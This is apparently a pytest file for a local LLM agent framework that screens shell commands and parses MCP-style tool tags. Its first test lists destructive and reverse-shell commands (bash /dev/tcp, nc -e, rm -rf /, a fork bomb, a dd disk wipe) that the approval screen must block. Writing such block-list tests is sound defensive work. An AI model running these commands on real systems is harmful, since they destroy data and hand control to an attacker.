"""
tests/test_neo_ai_integration.py — Unit & Integration Tests for Neo-AI & GWAYA v3.

Verifies:
1. GWAYA System 1 Zero-Trust Command Screening (blocking adversarial exploits).
2. MCP 5-Protocol Parser & Dispatchers (<mcp:terminal>, <mcp:files>, <mcp:analyze>, <mcp:network>, <mcp:security>).
3. NeoConfig loading from YAML/dict.
4. NeoAI Core local execution flow, AttentionMatter Redis LTM context integration, and recursive follow-up loop.
5. GWAYA v3 Daemon REST & MCP Server integration.
"""

from __future__ import annotations

import json
import os
import tempfile
from pathlib import Path
from unittest.mock import MagicMock, patch

import pytest

from anse.neo.approval import ApprovalHandler, CommandApprovalResult
from anse.neo.core import NeoAI, NeoConfig
from anse.neo.protocols import (
    AnalyzeProtocolHandler,
    FilesProtocolHandler,
    MCPProtocol,
    NetworkProtocolHandler,
    ProtocolRegistry,
    SecurityProtocolHandler,
    TerminalProtocolHandler,
)


def test_approval_handler_blocks_adversarial_commands():
    """GWAYA System 1 must immediately block reverse shells, fork bombs, and root disk wipes."""
    handler = ApprovalHandler(require_approval=True, auto_approve_all=False)

    adversarial_cmds = [
        "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
        "rm -rf /",
        "rm -rf / --no-preserve-root",
        ":(){ :|:& };:",
        "dd if=/dev/zero of=/dev/sda bs=1M",
        "nc -e /bin/sh 192.168.1.50 1337",
        "chmod -R 777 /etc",
    ]

    for cmd in adversarial_cmds:
        res = handler.request_approval(cmd, interactive=False)
        assert not res.approved, f"Command should be blocked: {cmd}"
        assert res.risk_level == "CRITICAL_BLOCKED"
        assert res.screened_by_gwaya_s1 is True
        assert res.adversarial_heuristic is not None


def test_approval_handler_read_only_and_auto_approve():
    """Read-only commands should have LOW risk; auto_approve_all should approve them safely."""
    handler = ApprovalHandler(require_approval=False, auto_approve_all=True)

    safe_cmds = ["uname -a", "uptime", "free -m", "ls -la /tmp", "whoami"]
    for cmd in safe_cmds:
        is_safe, risk, heuristic = handler.screen_command(cmd)
        assert is_safe is True
        assert risk == "LOW"
        assert heuristic is None

        res = handler.request_approval(cmd, interactive=False)
        assert res.approved is True
        assert res.risk_level == "LOW"


def test_mcp_protocol_tag_parsing():
    """MCP parser must accurately extract all tags and legacy <system> tags."""
    parser = MCPProtocol()

    text = """
    I will inspect the system now:
    <mcp:terminal>echo "Hello Sovereign"</mcp:terminal>
    Also checking files:
    <mcp:files>list:/var/log</mcp:files>
    And legacy tag:
    <system>uptime</system>
    """

    tags = parser.parse_mcp_tags(text)
    assert len(tags) == 3
    assert tags[0] == ("terminal", 'echo "Hello Sovereign"')
    assert tags[1] == ("files", "list:/var/log")
    assert tags[2] == ("terminal", "uptime")


def test_mcp_protocol_handlers_execution():
    """Protocol handlers must execute legitimate operations and return structured dicts."""
    handler = ApprovalHandler(require_approval=False, auto_approve_all=True)

    # 1. Terminal
    term = TerminalProtocolHandler()
    res_term = term.handle("echo 'NEO_TEST_OK'", handler, interactive=False)
    assert res_term["executed"] is True
    assert "NEO_TEST_OK" in res_term["output"]
    assert res_term["returncode"] == 0

    # 2. Files
    files = FilesProtocolHandler()
    with tempfile.NamedTemporaryFile(mode="w", delete=False) as tmp:
        tmp_path = tmp.name

    try:
        # Write
        res_w = files.handle(f"write:{tmp_path} Xavuntu SRE Sovereign Kernel", handler, interactive=False)
        assert res_w["executed"] is True

        # Read
        res_r = files.handle(f"read:{tmp_path}", handler, interactive=False)
        assert res_r["executed"] is True
        assert "Xavuntu SRE Sovereign Kernel" in res_r["output"]

        # List
        res_l = files.handle(f"list:{os.path.dirname(tmp_path)}", handler, interactive=False)
        assert res_l["executed"] is True
    finally:
        if os.path.exists(tmp_path):
            os.remove(tmp_path)

    # 3. Analyze
    analyze = AnalyzeProtocolHandler()
    res_a = analyze.handle("", handler, interactive=False)
    assert res_a["executed"] is True
    assert "CPU Load" in res_a["output"]
    assert "Memory Metrics" in res_a["output"]

    # 4. Network
    net = NetworkProtocolHandler()
    res_n = net.handle("interfaces", handler, interactive=False)
    assert res_n["executed"] is True
    assert "127.0.0.1" in res_n["output"] or "lo" in res_n["output"]

    # 5. Security (Users & Shield Audit)
    sec = SecurityProtocolHandler()
    res_s = sec.handle("users", handler, interactive=False)
    assert res_s["executed"] is True
    assert "root" in res_s["output"]

    res_shield = sec.handle("shield", handler, interactive=False)
    assert res_shield["executed"] is True
    assert "SOVEREIGN CYBER SHIELD" in res_shield["output"]


def test_neo_config_initialization():
    """NeoConfig must load defaults and serialize correctly."""
    cfg = NeoConfig(
        model="gwaya-qwen:14b-t4",
        fallback_model="gwaya-qwen:3.8-quant",
        max_context_tokens=8192,
    )
    d = cfg.to_dict()
    assert d["model"] == "gwaya-qwen:14b-t4"
    assert d["fallback_model"] == "gwaya-qwen:3.8-quant"
    assert d["max_context_tokens"] == 8192

    cfg_restored = NeoConfig.from_dict(d)
    assert cfg_restored.model == cfg.model


def test_neo_ai_core_query_with_mocked_ollama():
    """NeoAI core query loop must handle MCP execution and recursive synthesis."""
    cfg = NeoConfig(
        model="gwaya-qwen:14b-t4",
        auto_approve_all=True,
        require_approval=False,
    )
    neo = NeoAI(config=cfg)

    # Mock Ollama HTTP responses:
    # 1st call returns an MCP command tag
    # 2nd call returns the synthesis
    mock_responses = [
        MagicMock(
            status_code=200,
            json=lambda: {"message": {"content": "Inspecting uptime now: <mcp:terminal>uptime</mcp:terminal>"}},
        ),
        MagicMock(
            status_code=200,
            json=lambda: {"message": {"content": "The system uptime shows load average is normal."}},
        ),
    ]

    with patch("requests.post", side_effect=mock_responses):
        res = neo.query("Check the system uptime", interactive=False, stream=False)

    assert "mcp_results" in res
    assert "terminal" in res["mcp_results"]
    assert res["mcp_results"]["terminal"]["executed"] is True
    assert "uptime" in res["mcp_results"]["terminal"]["command"]
    assert "The system uptime shows load average is normal." in res["response"]
    assert res["turn"] == 1


def test_gwaya_v3_daemon_tool_call():
    """GWAYA MCPServer must route gwaya_neo_query tool calls properly."""
    from scripts.gwaya_v3_daemon import GwayaEngineV3, GwayaMCPServer

    engine = GwayaEngineV3()
    server = GwayaMCPServer(engine)

    # Test tool listed
    tool_defs = server.get_tool_definitions()
    tool_names = [t["name"] for t in tool_defs]
    assert "gwaya_neo_query" in tool_names

    # Test tool call with safe command
    with patch.object(NeoAI, "query", return_value={"query": "test", "response": "OK", "model": "mock"}):
        res = server.handle_call_tool("gwaya_neo_query", {"query": "Vérifie les ports", "auto_approve": True})
        assert res.get("response") == "OK"
